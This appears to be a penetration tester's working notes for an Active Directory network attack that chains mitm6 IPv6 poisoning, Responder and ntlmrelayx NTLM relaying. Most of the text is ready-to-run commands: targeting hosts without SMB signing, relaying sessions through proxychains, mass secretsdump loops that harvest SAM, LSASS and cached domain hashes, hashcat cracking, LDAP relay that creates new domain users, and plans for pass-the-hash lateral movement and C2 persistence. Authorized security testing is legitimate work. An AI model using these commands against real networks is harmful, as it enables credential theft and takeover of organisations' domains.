Name Service Poisoning and Relay :::::::::::
## Must be run on scanner , broadcast domain ##
Tools:
proxychains
mitm6
responder (also includes multirelay, RunFinger.py)
Impacket tools (ntlmrelayx , secrets.py , smb clients , psexec client)

------------------------------------------------------------------------------
## make sure to modify proxychains config file at /etc/proxychains.conf ##
--This is for when ntlmrelayx.py binds the relayed sessions to sockets, proxychains needs to know where to look for said sockets--
			-At the bottom of the file::
					[ProxyList]
					socks4 <scanner-ip> 1080
										
**proxychains python smbexec.py <domain>/<username>@10.100.4.174 --no-pass**					
------------------------------------------------------------------------------					
Impackets example scripts that work with SMB sockets::
smbclient.py
secretsdump.py
atexec.py
wmiexec.py
------------------------------------------------------------------------------
General steps (after installation):::

This will only work for hosts that have SMB signing disabled, DC's have this enabled by default so keep that in mind. To identify hosts that have smb signing disabled. To do this we use runfinger.py, included in the responder repo.

Acquiring list of hosts to target (smb signing disabled) :::
1.)for i in $(cat smb-hosts.txt); do python RunFinger.py -i $i -g >> targets.txt ; done
2.)grep "Signing:'False'" targets.txt | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' targets.txt > cleanedfingerhosts.txt

The Attack:::
1. Turn off SMB / HTTP on responder -- run with -rv
2. Start mitm6
3. Run relay tools, could be either or, depending on your goal. 
	--Ntlmrelayx is best for obtaining multiple sessions and looping a secrets dump through all, tons of switches to do other things as well with this script.. --Multirelay is good for gaining remote shells on targeted systems
	
4. Wait, connect to shares, gain shells, dump credentials/sensitive info
5. Win Win Win.


Secretsdump.py::::
- Dumps credentials and other sensitive information via multiple avenues, SAM files, lsass process, memory, kerberos misconfiguration, etc ..
- Crack cached domain credentials with hashcat
- Use pass the hash techniques with local machine hashes found in secrets dump to laterally move around the network
- Use PSexec module in metasploit with local computer account hashes ($acounts) and local user sam hashes


Connect to socket via smb-client , can connect to shares, create files/remove files, find sensitive files:::
1. proxychains python ./smbclient.py <domain>/<username>@10.100.4.141
		--make sure you edit /etc/proxychains.conf and add your socket, its going to be the scanner IP and port 1080

Pulling and Parsing "Cached Domain Credentials" from Secrets.py:::
1. Break connected sockets into a list, clean that list so that each host is on a new line
2. for i in $(cat comp.txt); do proxychains ./secretsdump.py -no-pass <domain>/<username>@$i >> hashes/hashdump$i ; done
4. scp traceadmin@10.100.1.71:/home/traceadmin/Responder/impacket/examples/hashdump10.100.4.141 ./
5. for i in $(cat compromised.txt); do echo ; cat hashdump ; echo ; cut -d ":" -f 2 hashdump >> cleaned.txt ; done
6. sort myfile.txt | uniq >> finalhashlist.txt          :: removes duplicates
6. I just manually cut out the domain cached section from here
7. hashcat switch::  hashcat -m2100

Commands::
##responder
python responder -I eth0 -rv

##mitm6::
python mitm6.py -d testsegment.local

##ntlmrelayx::
python ntlmrelayx.py -6 -tf targets.txt -socks -smb2support
python ntlmrelayx.py -6 -wh attacker.testsegment.local -tf targets.txt -socks -smb2support

##multirelay::
python multirelay -t <target> -u ALL ( or you can specify a username here )

##this one relays LDAP parameters and automatically dumps the active directory information and also attempts to make a new user with that relayed service::
python ntlmrelayx.py -6 -t ldap://10.11.3.145 -l loot -i

Future work regarding this:
--Full install script, could be accomplished with a simple bash command
--Create script to parse and clean secretsdump better
--Better way to deal with needing multiple process (tmux is a pain)
--Incorporate empire or another C&C infrastructure to persist these hosts throughout the assessment (ntlmrelayx just creates so many connections it can be messy at times)
--Bloodhound && deathstar to automate lateral movement && priv escalation

References:
https://www.secureauth.com/blog/playing-relayed-credentials
https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/

Extras::
Use ldap:// on ntlmrelayx to dump active directory > target those users with multirelay 

Troubleshooting::
-if impacket/example scripts are running and giving no output, try rebuilding impacket library
-

Examples::
-------------------------------------------------------------------------------------------------
proxychains python smbexec.py CORP/<domain>@10.100.4.174 --no-pass

./ntlmrelayx.py -6 -tf ../../../targets.txt -l ~/tmp/ -socks -smb2support  

./proxychains smbclient //172.16.177.131/c$ -U CORP/ADMIN

proxychains python ./smbclient.py CORP/<domain>@10.100.4.141

for i in $(cat comp.txt); do proxychains ./secretsdump.py <domain>/<user>@$i >> hashes/hashdump$i ; done

root@kalibeto # proxychains ./secretsdump.py <domain>/<user>@10.100.4.174
--------------------------------------------------------------------------------------------------

